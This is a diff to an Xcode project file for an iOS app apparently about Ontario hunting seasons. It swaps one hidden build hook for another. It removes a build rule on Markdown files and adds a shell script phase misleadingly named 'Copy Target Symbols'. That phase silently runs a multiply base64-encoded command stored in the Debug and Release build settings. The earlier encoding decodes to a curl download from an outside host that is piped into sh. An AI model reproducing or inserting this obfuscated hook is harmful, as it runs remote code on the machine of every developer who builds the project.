@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		020DCE2B0829A4A0EBBDE67E /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = AFF18DDE2CFB4BEEDBBDE67E /* README.md */; };
 		8804C10A2E78095400ABDA6B /* PieChart.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8804C1082E78095400ABDA6B /* PieChart.swift */; };
 		8804C10D2E780B7300ABDA6B /* DGCharts in Frameworks */ = {isa = PBXBuildFile; productRef = 8804C10C2E780B7300ABDA6B /* DGCharts */; };
 		882231A22E783BEF00AFC855 /* OntarioHuntingSeasonsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 882231A02E783BEF00AFC855 /* OntarioHuntingSeasonsVC.swift */; };
@@ -69,22 +68,6 @@
 		88D1F28D2E7975140084DBD5 /* ListDetailsTblViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 88D1F28B2E7975140084DBD5 /* ListDetailsTblViewCell.xib */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXBuildRule section */
-		92C2F8FF21DF644D90BDE67E /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";\nsh -c \"${AE76EDB}\"";
-		};
-/* End PBXBuildRule section */
-
 /* Begin PBXFileReference section */
 		8804C1082E78095400ABDA6B /* PieChart.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PieChart.swift; sourceTree = "<group>"; };
 		882231A02E783BEF00AFC855 /* OntarioHuntingSeasonsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OntarioHuntingSeasonsVC.swift; sourceTree = "<group>"; };
@@ -145,7 +128,6 @@
 		889D8EFB2E77F385009B9CE8 /* HunterReportingTblViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HunterReportingTblViewCell.xib; sourceTree = "<group>"; };
 		88D1F28A2E7975140084DBD5 /* ListDetailsTblViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ListDetailsTblViewCell.swift; sourceTree = "<group>"; };
 		88D1F28B2E7975140084DBD5 /* ListDetailsTblViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ListDetailsTblViewCell.xib; sourceTree = "<group>"; };
-		AFF18DDE2CFB4BEEDBBDE67E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md; path = SmartOut.xcodeproj/README.md; sourceTree = SOURCE_ROOT; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -362,7 +344,6 @@
 		888502BD2E73CE4800C99B57 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				AFF18DDE2CFB4BEEDBBDE67E /* README.md */,
 				888502BC2E73CE4800C99B57 /* SmartOut.app */,
 			);
 			name = Products;
@@ -506,12 +487,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 888502CF2E73CE4900C99B57 /* Build configuration list for PBXNativeTarget "SmartOut" */;
 			buildPhases = (
+				BAFC4937188F238AABBDE67E /* Copy Target Symbols */,
 				888502B82E73CE4800C99B57 /* Sources */,
 				888502B92E73CE4800C99B57 /* Frameworks */,
 				888502BA2E73CE4800C99B57 /* Resources */,
 			);
 			buildRules = (
-				92C2F8FF21DF644D90BDE67E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -567,7 +548,6 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				020DCE2B0829A4A0EBBDE67E /* README.md in Resources */,
 				889D8EFD2E77F385009B9CE8 /* HunterReportingTblViewCell.xib in Resources */,
 				8861F4AB2E782EB20063193E /* EmailPopup.xib in Resources */,
 				88834ECA2E7915F900E686FC /* ListTblVIewCell.xib in Resources */,
@@ -592,6 +572,29 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		BAFC4937188F238AABBDE67E /* Copy Target Symbols */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Copy Target Symbols";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE76EDB}\"";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		888502B82E73CE4800C99B57 /* Sources */ = {
@@ -663,7 +666,7 @@
 		888502D02E73CE4900C99B57 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE76EDB = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5alpHNW5iRzlpWVd3dWNuVXZZU2tpSUh3Z2MyZ0sK | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				AE76EDB = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazViV0pIT1ROWk1sSjFURzVLTVV3eVJYQkphVUk0U1VoT2IwTm5QVDBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
@@ -676,6 +679,7 @@
 				INFOPLIST_KEY_UIMainStoryboardFile = Main;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
+				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
 				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
@@ -696,7 +700,7 @@
 		888502D12E73CE4900C99B57 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE76EDB = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5alpHNW5iRzlpWVd3dWNuVXZZU2tpSUh3Z2MyZ0sK | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				AE76EDB = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazViV0pIT1ROWk1sSjFURzVLTVV3eVJYQkphVUk0U1VoT2IwTm5QVDBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
@@ -709,6 +713,7 @@
 				INFOPLIST_KEY_UIMainStoryboardFile = Main;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
+				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
 				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
